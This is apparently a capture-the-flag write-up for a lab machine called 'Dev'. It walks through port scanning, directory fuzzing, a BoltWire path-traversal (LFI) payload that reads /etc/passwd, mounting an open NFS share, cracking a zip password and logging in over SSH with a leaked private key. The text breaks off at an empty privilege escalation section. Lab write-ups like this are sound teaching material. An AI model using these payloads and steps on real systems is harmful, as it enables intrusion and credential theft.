# Dev machine writeup
Starting with nmap scan
```
sudo nmap 192.168.0.106 -T4 -A -p-
```

![nmap_scan](https://github.com/moataz-bellah/writeups/assets/47069499/0a26779d-dac7-43d4-a7c5-bab4a06393a1)

We have a lot of ports, but we will focus on 22, 80, 8080, 2049. We have two ports for http 80 and 8080. Let's see both of them.
- On port 80

![boltwire_port_80](https://github.com/moataz-bellah/writeups/assets/47069499/16a62c1b-5b5a-4844-9de2-cc55ac5ac842)

- On port 8080

![boltwire_port_8080](https://github.com/moataz-bellah/writeups/assets/47069499/41dd0ef2-e72a-40ed-95ab-718e8c4f08de)

Ok, let's do directory busting to find more useful dirs. I did dirbusting on both ports 80, 8080.

- For port 80

```
ffuf -u http://192.168.0.106/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
/extensions
/vendor
/app
/src
/public
```

- For port 8080

```
ffuf -u http://192.168.0.106:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
/dev
```

We found a lot of paths, to save your time i checked all of them and i only found two useful directories /dev, /app. Let's start with /app. Inside /app, you will find some interesting files, but i want to  
on /app/config/config.yaml. When i checked that file, i found sqlite credentials

```
database:
    driver: sqlite
    databasename: bolt
    username: bolt
    password: I_love_java
```

Let's see /dev

![bolt_wire_login](https://github.com/moataz-bellah/writeups/assets/47069499/2228f650-8382-480a-96b3-467a3be2d50f)

I tried to login with the credentials (username: bolt, password: I_love_java) we found, but i didn't work. Ok, let's create a new account using from register. I created one (username: test, password: test).  
Exploring the site and i found something might be useful when you click print in the navbar.

![bolt_wire_version](https://github.com/moataz-bellah/writeups/assets/47069499/73cb83af-e18f-40a5-b0c8-83e91c751b5d)

Ok, we have the site version. I searched online for any exploit, and i found this site vulnerable to LFI. See these link for more information https://www.exploit-db.com/exploits/48411
https://github.com/Cyber-Wo0dy/CVE-2023-46501. Note, you have to be logged in to execute the exploit. Using /index.php?p=action.search&action=../../../../../../../etc/passwd i found that

![lfi_exploit](https://github.com/moataz-bellah/writeups/assets/47069499/582c44ba-f31d-42a3-95b4-f35ece34d933)

I found username "jeanpaul". I tried some other sensitive files, but it didn't work. Nothing more in this site. Let's move to port 2049.

```
showmount -e 192.168.0.106
Export list for 192.168.0.106:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```

Good, we have /srv/nfs, let's get it and see what it has.

```
mkdir /mnt/test
sudo mount -t nfs 192.168.0.106:/srv/nfs /mnt/test
```

I found a zip file "save.zip" protected with a passwrod. We crack the password using fcrackzip tool

```
sudo fcrackzip -D -u -p /home/robot/Desktop/rockyou.txt save.zip

PASSWORD FOUND!!!!: pw == java101
```

After unzipping the file, i found two files todo.txt , id_rsa.

```
cat todo.txt
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp
```

It has nothing interesting, but we have a great file id_rsa which is a private key for ssh. Let's try to login to ssh using that file. I tried with (username: bolt, password: I_love_java), but it didn't work
I tried to login with (username: jeanpaul, password: I_love_java)

```
ssh -i id_rsa jeanpaul@192.168.0.106                            
Enter passphrase for key 'id_rsa': I_love_java
```

![ssh](https://github.com/moataz-bellah/writeups/assets/47069499/e98820f6-33f9-4d33-9331-cdf017fd8c84)

Heeey, we are in.

# Privilege Escalation




